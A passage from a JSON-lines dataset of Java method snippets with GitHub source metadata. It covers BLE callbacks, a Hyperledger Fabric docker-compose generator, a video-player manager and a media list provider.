message\");\n\t\tThread.sleep(1000L);\n\t\tassertThat(output).contains(\"Test message\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-activemq/src/test/java/smoketest/activemq/SampleActiveMqTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33439, "method_name": "getKey", "class_name": "BleBaseCallback", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getKey() {\n        return key;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/callback/BleBaseCallback.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33440, "method_name": "setKey", "class_name": "BleBaseCallback", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setKey(String key) {\n        this.key = key;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/callback/BleBaseCallback.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33441, "method_name": "getHandler", "class_name": "BleBaseCallback", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Handler", "snippet": "    public Handler getHandler() {\n        return handler;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/callback/BleBaseCallback.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33442, "method_name": "setHandler", "class_name": "BleBaseCallback", "params": ["Handler"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHandler(Handler handler) {\n        this.handler = handler;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/callback/BleBaseCallback.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33443, "method_name": "peerComposeFileGen", "class_name": "DockerConfigGenImpl", "params": ["InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean peerComposeFileGen(InitConfigEntity initConfig) {\n        // \u6839\u636e IP \u5730\u5740\u5206\u7ec4\n        Map<String, List<String>> peerGroups = this.groupHostByIp(initConfig.getPeerHostConfig());\n\n        // \u6bcf\u4e2a IP \u4e00\u4e2a docker-compose \u6587\u4ef6\n        for (String serverIp : peerGroups.keySet()) {\n            String path = String.format(\"fabric-net/dockerFile/peer-%s/\", serverIp);\n            String filePath = null;\n            try {\n                filePath = createPeerYamlFile(initConfig, serverIp, peerGroups.get(serverIp), path);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            if (StringUtils.isEmpty(filePath)) {\n                return false;\n            }\n        }\n\n        return true;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/config/configGenImpl/DockerConfigGenImpl.java", "stars": "7", "class_props": {"extends": null, "implements": ["DockerConfigGen"], "modifiers": ["public"]}}, {"id": 33444, "method_name": "ordererComposeFileGen", "class_name": "DockerConfigGenImpl", "params": ["InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean ordererComposeFileGen(InitConfigEntity initConfig) {\n        // \u6839\u636e IP \u5730\u5740\u5206\u7ec4\n        Map<String, List<String>> orderGroups = this.groupHostByIp(initConfig.getOrdererHostConfig());\n        // \u6bcf\u4e2a IP \u4e00\u4e2a docker-compose \u6587\u4ef6\n        for (String orderServerIp : orderGroups.keySet()) {\n            String filePath = null;\n            try {\n                filePath = createOrdererYamlFile(initConfig, orderServerIp, orderGroups.get(orderServerIp), null);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            if (StringUtils.isEmpty(filePath)) {\n                return false;\n            }\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/config/configGenImpl/DockerConfigGenImpl.java", "stars": "7", "class_props": {"extends": null, "implements": ["DockerConfigGen"], "modifiers": ["public"]}}, {"id": 33445, "method_name": "groupHostByIp", "class_name": "DockerConfigGenImpl", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "Map<String,List>", "snippet": "    public Map<String, List<String>> groupHostByIp(Map<String, String> nodeHostConfig) {\n        Map<String, List<String>> groups = new HashMap<>(16);\n\n        for (String url : nodeHostConfig.keySet()) {\n            String ip = nodeHostConfig.get(url);\n            int index = ip.lastIndexOf(\":\");\n            String port = ip.substring(index + 1);\n            ip = ip.substring(0, index);\n\n            List<String> nodes;\n            if (groups.containsKey(ip)) {\n                nodes = groups.get(ip);\n            } else {\n                nodes = new ArrayList<>();\n                groups.put(ip, nodes);\n            }\n            nodes.add(url + \":\" + port);\n        }\n        return groups;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/config/configGenImpl/DockerConfigGenImpl.java", "stars": "7", "class_props": {"extends": null, "implements": ["DockerConfigGen"], "modifiers": ["public"]}}, {"id": 33446, "method_name": "createOrdererYamlFile", "class_name": "DockerConfigGenImpl", "params": ["InitConfigEntity", "String", "List<String>", "String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String createOrdererYamlFile(InitConfigEntity initConfig, String hostIp, List<String> orderHosts, String folderName) throws IOException {\n        String workingDir = modeService.getInitDir();\n        Map<Object, Object> ordererComposeConfig = yamlFileService.loadYamlFile(workingDir + \"/template/docker-compose-orderer.yaml\");\n\n        Map<Object, Object> networks = (Map<Object, Object>) ordererComposeConfig.get(\"networks\");\n        networks.clear();\n        for (int i = 0; i < orderHosts.size(); ++i) {\n            networks.put(initConfig.getNetwork() + i, null);\n        }\n\n        Map<Object, Object> valumes = (Map<Object, Object>) ordererComposeConfig.get(\"volumes\");\n        valumes.clear();\n        for (String orderHost : orderHosts) {\n            valumes.put(orderHost.substring(0, orderHost.lastIndexOf(\":\")), null);\n        }\n\n        Map<Object, Object> services = (Map<Object, Object>) ordererComposeConfig.get(\"services\");\n        services.clear();\n\n        for (int hostIndex = 0; hostIndex < orderHosts.size(); ++hostIndex) {\n            String orderHost = orderHosts.get(hostIndex);\n\n            int index = orderHost.lastIndexOf(\":\");\n            String port = orderHost.substring(index + 1);\n            orderHost = orderHost.substring(0, index);\n\n            Map<Object, Object> orderConfig = yamlFileService.loadYamlFile(workingDir + \"template/orderer.yaml\");\n            Map<Object, Object> config = (Map<Object, Object>) orderConfig.get(\"orderer.example.com\");\n            config.put(\"container_name\", orderHost);\n            int finalHostIndex = hostIndex;\n            config.put(\"networks\", new ArrayList<String>() {{\n                add(initConfig.getNetwork() + finalHostIndex);\n            }});\n\n            List<String> newVols = new ArrayList<>();\n            List<String> vols = (List<String>) config.get(\"volumes\");\n            for (String item : vols) {\n                String newItem;\n                if (item.contains(\"orderer.example.com\")) {\n                    newItem = item.replace(\"orderer.example.com\", orderHost);\n                } else {\n                    newItem = item;\n                }\n                if (newItem.contains(\"example.com\")) {\n                    int i = orderHost.indexOf(\".\");\n                    newItem = newItem.replace(\"example.com\", orderHost.substring(i + 1));\n                }\n\n                newVols.add(newItem);\n            }\n            newVols.add(\"/var/run/:/opt/gopath/src/github.com/hyperledger/fabric\");\n            config.put(\"volumes\", newVols);\n\n            // extra_hosts\n            List<String> extraHosts = new ArrayList<>();\n            for (String eHost : initConfig.getOrdererHostConfig().keySet()) {\n                if (eHost.equalsIgnoreCase(orderHost)) {\n                    continue;\n                }\n\n                String eIp = initConfig.getOrdererHostConfig().get(eHost);\n                eIp = eIp.substring(0, eIp.lastIndexOf(\":\"));\n                if (eIp.equalsIgnoreCase(\"127.0.0.1\")) {\n                    eIp = NetUtil.getMyNormalIP();\n                }\n                extraHosts.add(eHost + \":\" + eIp);\n            }\n            if (!CollectionUtils.isEmpty(extraHosts)) {\n                config.put(\"extra_hosts\", extraHosts);\n            }\n\n            List<String> ports = (List<String>) config.get(\"ports\");\n            ports.clear();\n            ports.add(port + \":7050\");\n\n            services.put(orderHost, config);\n        }\n\n        String filePath = workingDir + String.format(\"fabric-net/dockerFile/%s/\", StringUtils.isEmpty(folderName) ? \"order-\" + hostIp : folderName);\n        FileUtil.makeFilePath(filePath, false);\n        String yamlFilePath = filePath + \"docker-compose-orderer.yaml\";\n        if (!yamlFileService.writeObjectToYamlFile(ordererComposeConfig, yamlFilePath)) {\n            return null;\n        }\n\n        // \u590d\u5236 start-orderer.sh\n        /*String content = getFileContent(workingDir + \"template/start-peer.sh\");\n        String newFilePath = filePath + \"start-orderer.sh\";\n\n        if (!writeFileContent(newFilePath, content)) {\n            return null;\n        }*/\n        String srcShFilePath = workingDir + \"template/start-peer.sh\";\n        String newShFilePath = filePath + \"start-orderer.sh\";\n        FileUtils.copyFile(new File(srcShFilePath), new File(newShFilePath));\n        return yamlFilePath;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/config/configGenImpl/DockerConfigGenImpl.java", "stars": "7", "class_props": {"extends": null, "implements": ["DockerConfigGen"], "modifiers": ["public"]}}, {"id": 33447, "method_name": "createPeerYamlFile", "class_name": "DockerConfigGenImpl", "params": ["InitConfigEntity", "String", "List<String>", "String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String createPeerYamlFile(InitConfigEntity initConfig, String hostIp, List<String> peerHosts, String folderName) throws IOException {\n\n        Map<Object, Object> peerComposeConfig = yamlFileService.loadYamlFile(modeService.getInitDir() + \"template/docker-compose-peer.yaml\");\n\n        Map<Object, Object> networks = (Map<Object, Object>) peerComposeConfig.get(\"networks\");\n        networks.clear();\n        networks.put(initConfig.getNetwork(), null);\n\n        Map<Object, Object> valumes = (Map<Object, Object>) peerComposeConfig.get(\"volumes\");\n        valumes.clear();\n        for (String host : peerHosts) {\n            valumes.put(host.substring(0, host.lastIndexOf(\":\")), null);\n        }\n\n        Map<Object, Object> services = (Map<Object, Object>) peerComposeConfig.get(\"services\");\n        Map<Object, Object> cliConfig = (Map<Object, Object>) services.get(\"cli\");\n        services.clear();\n\n        List<String> dependsOn = (List<String>) cliConfig.get(\"depends_on\");\n        dependsOn.clear();\n\n        // \u83b7\u53d6\u5176\u4ed6 peer \u914d\u7f6e\n        Map<String, String> othPeerHostConfig = new HashMap<>();\n        Set<String> peerHostSet = new HashSet<>(peerHosts);\n        for (String host : initConfig.getPeerHostConfig().keySet()) {\n            String origIp = initConfig.getPeerHostConfig().get(host);\n            String ip = origIp.split(\":\")[0];\n            String port = origIp.split(\":\")[1];\n            if (!ip.equalsIgnoreCase(hostIp)) {\n                othPeerHostConfig.put(host, origIp);\n            } else {\n                host = host + \":\" + port;\n                peerHostSet.add(host);\n            }\n        }\n\n        // peer\n        /*int couchDbPort = 7984;*/\n        /*int ssPort = 9443;*/\n        String firstHost = null;\n        for (String peerHost : peerHosts) {\n            if (StringUtils.isEmpty(firstHost)) {\n                firstHost = peerHost;\n            }\n\n            String finalPeerHost = peerHost;\n            List<String> otherPeerHosts = peerHostSet.stream().filter(i -> !i.equals(finalPeerHost)).collect(Collectors.toList());\n            if (!CollectionUtils.isEmpty(otherPeerHosts)) {\n                for (String otherHost : otherPeerHosts) {\n                    String host = otherHost.split(\":\")[0];\n                    // log.info(\"\u6269\u5bb9\u8282\u70b9\u5176\u4ed6\u8282\u70b9\u7684host:\" + host);\n                    log.info(\"Hosts of other nodes in the expansion node:\" + host);\n                    String origIp = initConfig.getPeerHostConfig().get(host);\n                    if (origIp.contains(\"127.0.0.1\")) {\n                        origIp = NetUtil.getMyNormalIP() + \":\" + origIp.split(\":\")[1];\n                    }\n                    othPeerHostConfig.put(host, origIp);\n                }\n            }\n\n            String peerHostPreFix = peerHost.split(initConfig.getPeerDomain())[0];\n            // couchdb\n            Map<Object, Object> couchDbConfig = new HashMap<>();\n            couchDbConfig.put(\"container_name\", peerHostPreFix + initConfig.getOrgMSPID() + \".\" + \"couchdb\");\n            couchDbConfig.put(\"image\", \"hyperledger/fabric-couchdb\");\n            couchDbConfig.put(\"environment\", new ArrayList<String>() {{\n                add(\"COUCHDB_USER=\");\n                add(\"COUCHDB_PASSWORD=\");\n            }});\n\n            String origHost = peerHost;\n            int index = peerHost.lastIndexOf(\":\");\n            int port = Integer.parseInt(peerHost.substring(index + 1));\n            peerHost = peerHost.substring(0, index);\n\n            String finalCouchdbPeerHost = peerHost;\n            couchDbConfig.put(\"ports\", new ArrayList<String>() {{\n                add(initConfig.getCouchdbPortConfig().get(finalCouchdbPeerHost) + \":5984\");\n            }});\n            couchDbConfig.put(\"networks\", new ArrayList<String>() {{\n                add(initConfig.getNetwork());\n            }});\n            services.put(peerHostPreFix + initConfig.getOrgMSPID() + \".\" + \"couchdb\", couchDbConfig);\n\n            //\n            Map<Object, Object> peerConfig = yamlFileService.loadYamlFile(modeService.getInitDir() + \"template/peer.yaml\");\n            Map<Object, Object> config = (Map<Object, Object>) peerConfig.get(\"peer0.org1.example.com\");\n            config.put(\"container_name\", peerHost);\n            config.put(\"networks\", new ArrayList<String>() {{\n                add(initConfig.getNetwork());\n            }});\n\n            List<String> newVols = new ArrayList<>();\n            List<String> vols = (List<String>) config.get(\"volumes\");\n            for (String item : vols) {\n                String newItem;\n                if (item.contains(\"peer0.org1.example.com\")) {\n                    newItem = item.replace(\"peer0.org1.example.com\", peerHost);\n                } else {\n                    newItem = item;\n                }\n                if (newItem.contains(\"org1.example.com\")) {\n                    int i = peerHost.indexOf(\".\");\n                    newItem = newItem.replace(\"org1.example.com\", peerHost.substring(i + 1));\n                }\n\n                newVols.add(newItem);\n            }\n            config.put(\"volumes\", newVols);\n\n            // environment\n            List<String> environment = new ArrayList<>();\n            environment.add(\"CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock\");\n\n            String netWorkConfig;\n            if (folderName.contains(\"new\")) {\n                String peerPathSplit = folderName.split(\"peer-\")[1];\n                String peerNetSplit = peerPathSplit.split(File.separator)[0];\n                netWorkConfig = \"peer-\" + peerNetSplit + \"_\" + initConfig.getNetwork();\n            } else {\n                netWorkConfig = \"peer_\" + initConfig.getNetwork();\n            }\n\n            environment.add(\"CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=\" + netWorkConfig);\n            environment.add(\"FABRIC_LOGGING_SPEC=INFO\");\n            environment.add(\"CORE_PEER_TLS_ENABLED=true\");\n            environment.add(\"CORE_PEER_GOSSIP_USELEADERELECTION=true\");\n            environment.add(\"CORE_PEER_GOSSIP_ORGLEADER=false\");\n            environment.add(\"CORE_PEER_PROFILE_ENABLED=true\");\n            environment.add(\"CORE_PEER_TLS_CERT_FILE=/etc/hyperledger/fabric/tls/server.crt\");\n            environment.add(\"CORE_PEER_TLS_KEY_FILE=/etc/hyperledger/fabric/tls/server.key\");\n            environment.add(\"CORE_PEER_TLS_ROOTCERT_FILE=/etc/hyperledger/fabric/tls/ca.crt\");\n            environment.add(\"CORE_PEER_ID=\" + peerHost);\n            environment.add(\"CORE_PEER_ADDRESS=\" + peerHost + \":\" + port);\n            environment.add(\"CORE_PEER_LISTENADDRESS=0.0.0.0:\" + port);\n            environment.add(\"CORE_PEER_CHAINCODEADDRESS=\" + peerHost + \":\" + (port + 1));\n            environment.add(\"CORE_PEER_CHAINCODELISTENADDRESS=0.0.0.0:\" + (port + 1));\n\n            if (CollectionUtils.isEmpty(othPeerHostConfig)) {\n                environment.add(\"CORE_PEER_GOSSIP_BOOTSTRAP=\" + origHost);\n            } else {\n                String firstKey = othPeerHostConfig.keySet().iterator().next();\n                String othIp = othPeerHostConfig.get(firstKey);\n                environment.add(\"CORE_PEER_GOSSIP_BOOTSTRAP=\" + firstKey + \":\" + othIp.substring(othIp.lastIndexOf(\":\") + 1));\n            }\n\n            environment.add(\"CORE_PEER_GOSSIP_EXTERNALENDPOINT=\" + origHost);\n            environment.add(\"CORE_PEER_LOCALMSPID=\" + initConfig.getOrgMSPID());\n            environment.add(\"CORE_OPERATIONS_LISTENADDRESS=0.0.0.0\" + \":9443\");\n            environment.add(\"CORE_METRICS_PROVIDER=prometheus\");\n            environment.add(\"CORE_LEDGER_STATE_STATEDATABASE=CouchDB\");\n            environment.add(\"CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=\" + peerHostPreFix + initConfig.getOrgMSPID() + \".\" + \"couchdb\" + \":5984\");\n            /*environment.add(\"CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=couchdb\" + hIndex + \":\" + finalCouchDbPort);*/\n            environment.add(\"CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME=\");\n            environment.add(\"CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD=\");\n\n            config.put(\"environment\", environment);\n\n            // depends_on\n            config.put(\"depends_on\", new ArrayList<String>() {{\n                add(peerHostPreFix + initConfig.getOrgMSPID() + \".\" + \"couchdb\");\n            }});\n\n            List<String> extraHosts = new ArrayList<>();\n            for (String host : initConfig.getOrdererHostConfig().keySet()) {\n                String ip = initConfig.getOrdererHostConfig().get(host);\n                int i = ip.lastIndexOf(\":\");\n                ip = ip.substring(0, i);\n\n                if (\"127.0.0.1\".equalsIgnoreCase(ip)) {\n                    ip = NetUtil.getMyNormalIP();\n                }\n                extraHosts.add(host + \":\" + ip);\n            }\n\n            if (!CollectionUtils.isEmpty(othPeerHostConfig)) {\n                for (String othHost : othPeerHostConfig.keySet()) {\n                    String othIp = othPeerHostConfig.get(othHost);\n                    int i = othIp.lastIndexOf(\":\");\n                    othIp = othIp.substring(0, i);\n                    if (\"127.0.0.1\".equals(othIp)) {\n                        othIp = NetUtil.getMyNormalIP();\n                    }\n                    if (!peerHost.contains(othHost)) {\n                        extraHosts.add(othHost + \":\" + othIp);\n                    }\n                }\n            }\n//            extraHosts.add(\"couchdb\" + hIndex + \":\" + hostIp);\n            if (!CollectionUtils.isEmpty(extraHosts)) {\n                config.put(\"extra_hosts\", extraHosts);\n            }\n\n            List<String> ports = (List<String>) config.get(\"ports\");\n            ports.clear();\n            ports.add(port + \":\" + port);\n            String metricsPort = initConfig.getMetricPortConfig().get(peerHost);\n            ports.add(metricsPort + \":\" + \"9443\");\n            services.put(peerHost, config);\n            dependsOn.add(peerHost);\n        }\n\n        int index = firstHost.lastIndexOf(\":\");\n        String onlyHost = firstHost.substring(0, index);\n        String orgUrl = initConfig.getPeerDomain();\n        List<String> newEnvironment = new ArrayList<>();\n        List<String> environment = (List<String>) cliConfig.get(\"environment\");\n        for (String oldEnv : environment) {\n            String newEnv;\n            if (oldEnv.contains(\"CORE_PEER_ADDRESS\")) {\n                newEnv = \"CORE_PEER_ADDRESS=\" + firstHost;\n            } else if (oldEnv.contains(\"CORE_PEER_LOCALMSPID\")) {\n                newEnv = \"CORE_PEER_LOCALMSPID=\" + initConfig.getOrgMSPID();\n            } else if (oldEnv.contains(\"CORE_PEER_TLS_CERT_FILE\")) {\n                newEnv = String.format(oldEnv, orgUrl, onlyHost);\n            } else if (oldEnv.contains(\"CORE_PEER_TLS_KEY_FILE\")) {\n                newEnv = String.format(oldEnv, orgUrl, onlyHost);\n            } else if (oldEnv.contains(\"CORE_PEER_TLS_ROOTCERT_FILE\")) {\n                newEnv = String.format(oldEnv, orgUrl, onlyHost);\n            } else if (oldEnv.contains(\"CORE_PEER_MSPCONFIGPATH\")) {\n                newEnv = String.format(oldEnv, orgUrl, orgUrl);\n            } else {\n                newEnv = oldEnv;\n            }\n            newEnvironment.add(newEnv);\n        }\n        cliConfig.put(\"environment\", newEnvironment);\n\n        cliConfig.put(\"networks\", new ArrayList<String>() {{\n            add(initConfig.getNetwork());\n        }});\n\n        cliConfig.remove(\"extra_hosts\");\n        services.put(\"cli\", cliConfig);\n\n        /*String filePath = workingDir + String.format(\"fabric-net/dockerFile/peer-%s/\", hostIp);*/\n        String filePath = modeService.getInitDir() + folderName;\n        FileUtil.makeFilePath(filePath, false);\n        String yamlFilePath = filePath + \"docker-compose-peer.yaml\";\n\n        // log.info(\"\u65b0\u8282\u70b9\u751f\u6210docker-compose\u6587\u4ef6\u8def\u5f84:\" + yamlFilePath);\n        log.info(\"The path of the docker-compose file generated by the new node:\" + yamlFilePath);\n\n        if (!yamlFileService.writeObjectToYamlFile(peerComposeConfig, yamlFilePath)) {\n            return null;\n        }\n\n        // \u751f\u6210 start-peer.sh\n        String newShFilePath = filePath + \"start-peer.sh\";\n        String srcShFilePath = modeService.getInitDir() + \"template/start-peer.sh\";\n        FileUtils.copyFile(new File(srcShFilePath), new File(newShFilePath));\n\n        return yamlFilePath;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/config/configGenImpl/DockerConfigGenImpl.java", "stars": "7", "class_props": {"extends": null, "implements": ["DockerConfigGen"], "modifiers": ["public"]}}, {"id": 33448, "method_name": "instance", "class_name": "GSYVideoManager", "params": [], "throws": null, "modifiers": ["public", "static", "synchronized"], "return_type": "GSYVideoManager", "snippet": "    public static synchronized GSYVideoManager instance() {\n        if (videoManager == null) {\n            videoManager = new GSYVideoManager();\n        }\n        return videoManager;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/GSYVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 33449, "method_name": "tmpInstance", "class_name": "GSYVideoManager", "params": ["GSYMediaPlayerListener"], "throws": null, "modifiers": ["public", "static", "synchronized"], "return_type": "GSYVideoManager", "snippet": "    public static synchronized GSYVideoManager tmpInstance(GSYMediaPlayerListener listener) {\n        GSYVideoManager gsyVideoManager = new GSYVideoManager();\n        gsyVideoManager.bufferPoint = videoManager.bufferPoint;\n        gsyVideoManager.optionModelList = videoManager.optionModelList;\n        gsyVideoManager.playTag = videoManager.playTag;\n        gsyVideoManager.currentVideoWidth = videoManager.currentVideoWidth;\n        gsyVideoManager.currentVideoHeight = videoManager.currentVideoHeight;\n        gsyVideoManager.context = videoManager.context;\n        gsyVideoManager.lastState = videoManager.lastState;\n        gsyVideoManager.playPosition = videoManager.playPosition;\n        gsyVideoManager.timeOut = videoManager.timeOut;\n        gsyVideoManager.needMute = videoManager.needMute;\n        gsyVideoManager.needTimeOutOther = videoManager.needTimeOutOther;\n        gsyVideoManager.setListener(listener);\n        return gsyVideoManager;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/GSYVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 33450, "method_name": "changeManager", "class_name": "GSYVideoManager", "params": ["GSYVideoManager"], "throws": null, "modifiers": ["public", "static", "synchronized"], "return_type": "void", "snippet": "    public static synchronized void changeManager(GSYVideoManager gsyVideoManager) {\n        videoManager = gsyVideoManager;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/GSYVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 33451, "method_name": "backFromWindowFull", "class_name": "GSYVideoManager", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean backFromWindowFull(Context context) {\n        boolean backFrom = false;\n        ViewGroup vp = (ViewGroup) (CommonUtil.scanForActivity(context)).findViewById(Window.ID_ANDROID_CONTENT);\n        View oldF = vp.findViewById(FULLSCREEN_ID);\n        if (oldF != null) {\n            backFrom = true;\n            hideNavKey(context);\n            if (GSYVideoManager.instance().lastListener() != null) {\n                GSYVideoManager.instance().lastListener().onBackFullscreen();\n            }\n        }\n        return backFrom;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/GSYVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 33452, "method_name": "releaseAllVideos", "class_name": "GSYVideoManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void releaseAllVideos() {\n        if (GSYVideoManager.instance().listener() != null) {\n            GSYVideoManager.instance().listener().onCompletion();\n        }\n        GSYVideoManager.instance().releaseMediaPlayer();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/GSYVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 33453, "method_name": "onPause", "class_name": "GSYVideoManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void onPause() {\n        if (GSYVideoManager.instance().listener() != null) {\n            GSYVideoManager.instance().listener().onVideoPause();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/GSYVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 33454, "method_name": "onResume", "class_name": "GSYVideoManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void onResume() {\n        if (GSYVideoManager.instance().listener() != null) {\n            GSYVideoManager.instance().listener().onVideoResume();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/GSYVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 33455, "method_name": "onResume", "class_name": "GSYVideoManager", "params": ["boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void onResume(boolean seek) {\n        if (GSYVideoManager.instance().listener() != null) {\n            GSYVideoManager.instance().listener().onVideoResume(seek);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/GSYVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 33456, "method_name": "isFullState", "class_name": "GSYVideoManager", "params": ["Activity"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isFullState(Activity activity) {\n        ViewGroup vp = (ViewGroup) (CommonUtil.scanForActivity(activity)).findViewById(Window.ID_ANDROID_CONTENT);\n        final View full = vp.findViewById(FULLSCREEN_ID);\n        GSYVideoPlayer gsyVideoPlayer = null;\n        if (full != null) {\n            gsyVideoPlayer = (GSYVideoPlayer) full;\n        }\n        return gsyVideoPlayer != null;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/GSYVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 33457, "method_name": "getList", "class_name": "MediaProvider", "params": ["Filters", "Callback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getList(Filters filters, Callback callback) {\n        getList(null, filters, callback);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33458, "method_name": "getList", "class_name": "MediaProvider", "params": ["ArrayList<Media>", "Filters", "Callback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getList(final ArrayList<Media> existingList, Filters filters, final Callback callback) {\n        final ArrayList<Media> currentList;\n        if (existingList == null) {\n            currentList = new ArrayList<>();\n        } else {\n            currentList = new ArrayList<>(existingList);\n        }\n\n        ArrayList<AbstractMap.SimpleEntry<String, String>> params = new ArrayList<>();\n        params.add(new AbstractMap.SimpleEntry<>(\"limit\", \"30\"));\n\n        if (filters == null) {\n            filters = new Filters();\n        }\n\n        if (filters.keywords != null) {\n            params.add(new AbstractMap.SimpleEntry<>(\"keywords\", filters.keywords));\n        }\n\n        if (filters.genre != null) {\n            params.add(new AbstractMap.SimpleEntry<>(\"genre\", filters.genre));\n        }\n\n        if (filters.order == Filters.Order.ASC) {\n            params.add(new AbstractMap.SimpleEntry<>(\"order\", \"1\"));\n        } else {\n            params.add(new AbstractMap.SimpleEntry<>(\"order\", \"-1\"));\n        }\n\n        if (filters.langCode != null) {\n            params.add(new AbstractMap.SimpleEntry<>(\"lang\", filters.langCode));\n        }\n\n        String sort;\n        switch (filters.sort) {\n            default:\n            case POPULARITY:\n                sort = \"popularity\";\n                break;\n            case YEAR:\n                sort = \"year\";\n                break;\n            case DATE:\n                sort = \"last added\";\n                break;\n            case RATING:\n                sort = \"rating\";\n                break;\n            case ALPHABET:\n                sort = \"name\";\n                break;\n            case TRENDING:\n                sort = \"trending\";\n                break;\n        }\n\n        params.add(new AbstractMap.SimpleEntry<>(\"sort\", sort));\n\n        String url = apiUrls[currentApi] + itemsPath;\n        if (filters.page != null) {\n            url += filters.page;\n        } else {\n            url += \"1\";\n        }\n\n        Request.Builder requestBuilder = new Request.Builder();\n        String query = 